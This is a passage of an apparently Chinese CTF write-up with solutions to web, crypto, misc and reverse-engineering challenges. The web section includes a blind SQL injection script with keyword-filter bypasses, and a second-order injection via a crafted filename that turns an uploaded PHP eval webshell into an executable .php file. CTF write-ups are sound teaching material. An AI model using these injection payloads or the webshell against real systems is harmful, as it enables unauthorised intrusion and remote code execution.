alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7396879.png" alt></p><p><img src="https://i.loli.net/2019/01/26/5c4c5f7398de3.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3570d4d9c72a19c889140674827eeca5&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="SimpleSQLi2">          <a href="#SimpleSQLi2" class="heading-link"><i class="fas fa-link"></i></a>SimpleSQLi2</h2>      <p>fuzz测试了一下感觉是数字型注入</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;-1%20||%201&#x3D;1</span><br></pre></td></tr></table></div></figure><p>接下来测试过滤规则</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6</span><br></pre></td></tr></table></div></figure><p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"2019~"</span></span><br><span class="line">url = <span class="string">"http://bxs.cumt.edu.cn:30010/test/index.php?id="</span></span><br><span class="line">table = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># emails,flagishere,referers,uagents,users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"><span class="comment"># Id,flag</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">128</span>):</span><br><span class="line">res = requests.get(url+payload.format(j,i)).text</span><br><span class="line"><span class="keyword">if</span> words <span class="keyword">in</span> res:</span><br><span class="line">table += chr(i)</span><br><span class="line">print(table)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><p>可以得到flag如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></div></figure><p>后来和出题人交流了一下，思路非预期2333~</p>        <h2 id="文件管理系统">          <a href="#文件管理系统" class="heading-link"><i class="fas fa-link"></i></a>文件管理系统</h2>      <p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p><p>核心代码如下</p><p>upload.php</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];       </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//echo $file["tmp_name"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">rename.php</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <span class="exturl"><a class="exturl__link" href="http://drops.xmd5.com/static/drops/tips-10564.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-10564.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，而且还给出了攻击流程，本题是个二次注入。</p><p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p><ol><li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p></li><li><p>利用update更新是的后缀名为空，<em>old name:</em>  <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>;<em>new name:</em> <code>snow.jpg</code>，此时执行的sql命令变成<br><code>update <code>file</code> set <code>filename</code>=’snow.jpg’,<code>oldname</code>=’’,extension=’’,filename=’snow.jpg.jpg’ where <code>fid</code>={$result[‘fid’]};</code> ，这样的话数据库中就有文件名为 <code>snow.jpg</code>，后缀名为空的记录，但是实际的文件名却是<code>snow.jpg.jpg</code></p></li><li><p>上传真正包含shell的文件<code>&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt;</code> ，命名为<code>snow.jpg</code>，数据库中的记录是文件名为snow，扩展名为jpg，</p></li><li><p>使用rename重命名 <em>old name:</em> <code>snow.jpg</code>，<em>new name:</em> <code>snow.php</code>，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为<code>snow.php</code>，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。</p></li></ol><p><img src="https://i.loli.net/2019/01/27/5c4d642c02f24.png" alt></p><p><img src="https://i.loli.net/2019/01/27/5c4d642bedc54.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="crypto">          <a href="#crypto" class="heading-link"><i class="fas fa-link"></i></a>crypto</h1>              <h2 id="现代密码签到">          <a href="#现代密码签到" class="heading-link"><i class="fas fa-link"></i></a>现代密码签到</h2>      <p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt></p>        <h2 id="古典密码签到">          <a href="#古典密码签到" class="heading-link"><i class="fas fa-link"></i></a>古典密码签到</h2>      <p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"xxxxxxxxxxxxx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></div></figure><p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## easyrsa</span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import gmpy2</span><br><span class="line">e &#x3D; 5</span><br><span class="line"># 读入 n, 密文</span><br><span class="line">n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)</span><br><span class="line">c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)</span><br><span class="line">m, b &#x3D; gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></div></figure></p><p>flag如下：<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></div></figure></p>        <h2 id="playfir">          <a href="#playfir" class="heading-link"><i class="fas fa-link"></i></a>playfir</h2>      <p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">li = pass_table.index(word)</span><br><span class="line">li_r = li // <span class="number">5</span></span><br><span class="line">li_c = li % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line"><span class="keyword">if</span> r1 == r2:</span><br><span class="line">c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">elif</span> c1 == c2:</span><br><span class="line">r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line"><span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line"><span class="comment"># global pass_table</span></span><br><span class="line">alpha = list(string.ascii_uppercase)</span><br><span class="line">alpha.remove(<span class="string">'J'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line"><span class="keyword">continue</span> </span><br><span class="line">alpha.remove(i)</span><br><span class="line">pass_table = list(keyword) + alpha</span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">plain += pass_table[p1] + pass_table[p2]</span><br><span class="line"><span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">t1 = decrypt(cip1,now_key)</span><br><span class="line">t2 = decrypt(cip2,now_key)</span><br><span class="line"><span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">print(t1)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">print(t2)</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></div></figure><p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p><blockquote><p>flagaplayfirflagbyoudoit</p></blockquote><p>求出md5值即可</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></div></figure>        <h1 id="MISC">          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a>MISC</h1>              <h2 id="misc签到">          <a href="#misc签到" class="heading-link"><i class="fas fa-link"></i></a>misc签到</h2>      <p>解压之后给出了5个图片文件:</p><p><img src="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png" alt></p><p>文件夹名是braille，想到了盲文，搜索盲文对照表</p><p><img src="https://i.loli.net/2019/01/29/5c4fc69264c59.png" alt></p><p>根据解压文件夹的提示可以对照出flag是B1ind。</p>        <h2 id="base全家桶了解一下">          <a href="#base全家桶了解一下" class="heading-link"><i class="fas fa-link"></i></a>base全家桶了解一下??</h2>      <p>应该就是base编码的转换，尝试一下不同的base编码即可</p><p>第一层base64</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></div></figure><p>第二层base32</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></div></figure><p>第三层base16</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="BXS图标真好看">          <a href="#BXS图标真好看" class="heading-link"><i class="fas fa-link"></i></a>BXS图标真好看</h2>      <p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p><blockquote><p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p></blockquote><p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p><p><img src="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png" alt></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="矿大校歌认真听听吧？">          <a href="#矿大校歌认真听听吧？" class="heading-link"><i class="fas fa-link"></i></a>矿大校歌认真听听吧？</h2>      <p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<span class="exturl"><a class="exturl__link" href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，运行尝试一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="起床改error啦！">          <a href="#起床改error啦！" class="heading-link"><i class="fas fa-link"></i></a>起床改error啦！</h2>      <p>binwalk查看图片发现存在zip压缩包，提取一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 2333.png</span><br><span class="line">foremost 2333.png</span><br></pre></td></tr></table></div></figure><p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p><p><img src="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png" alt></p>        <h1 id="RE">          <a href="#RE" class="heading-link"><i class="fas fa-link"></i></a>RE</h1>              <h2 id="逆向签到">          <a href="#逆向签到" class="heading-link"><i class="fas fa-link"></i></a>逆向签到</h2>      <p>直接丢进IDA查看，查看伪代码：</p><p><img src="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png" alt></p><p>可以看到这些变量占用了4个字节来存储。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1ade58965.png" alt></p><p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p><p><img src="https://i.loli.net/2019/01/28/5c4f1c7412770.png" alt></p><p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span 